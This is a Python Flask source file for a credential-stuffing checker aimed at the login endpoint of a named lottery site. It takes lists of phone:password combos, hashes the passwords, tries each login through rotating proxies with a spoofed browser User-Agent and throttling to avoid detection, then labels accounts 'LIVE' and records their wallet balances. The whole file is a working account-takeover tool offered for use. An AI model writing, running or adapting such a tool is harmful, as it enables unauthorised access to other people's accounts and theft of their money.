from flask import Flask, render_template, request, jsonify
import requests
import hashlib
import time
import random

app = Flask(__name__)

BASE = "https://mantripk.com/lottery-backend/glserver/user/"

def md5(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest()

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/check', methods=['POST'])
def check():
    data = request.json
    combos = data.get('combos', '').strip().splitlines()
    use_proxy = data.get('use_proxy', False)
    proxy_list = data.get('proxies', '').strip().splitlines()

    results = []
    live = 0

    for line in combos:
        if not line or ':' not in line:
            continue
            
        mobile, password = [x.strip() for x in line.split(':', 1)]
        
        mobile = mobile.replace(" ", "").replace("-", "")
        if not mobile.startswith("+91"):
            mobile = "+91" + mobile.lstrip("0")

        hashed = md5(password)

        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

        params = {"mobile": mobile, "password": hashed}

        proxy_dict = None
        if use_proxy and proxy_list:
            proxy = random.choice([p.strip() for p in proxy_list if p.strip()])
            if proxy:
                proxy_dict = {"http": proxy, "https": proxy}

        status = "ERROR"
        balance = "-"
        remark = "Unknown Error"

        try:
            r = requests.post(BASE + "login", params=params, headers=headers, 
                            proxies=proxy_dict, timeout=15)
            
            if r.status_code == 200:
                res = r.json()
                if res.get("res") == 1:
                    balance = res.get("obj", {}).get("balance", 0)
                    status = "✅ LIVE"
                    live += 1
                    remark = "Success"
                else:
                    status = "❌ DEAD"
                    remark = res.get("resMsg", "Unknown error")
            else:
                status = "❌ DEAD"
                remark = f"HTTP {r.status_code}"
        except Exception as e:
            remark = str(e)

        results.append([mobile, status, balance, remark])
        time.sleep(8 if use_proxy else 2)

    return jsonify({
        "status": "done",
        "live": live,
        "total": len(results),
        "results": results
    })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
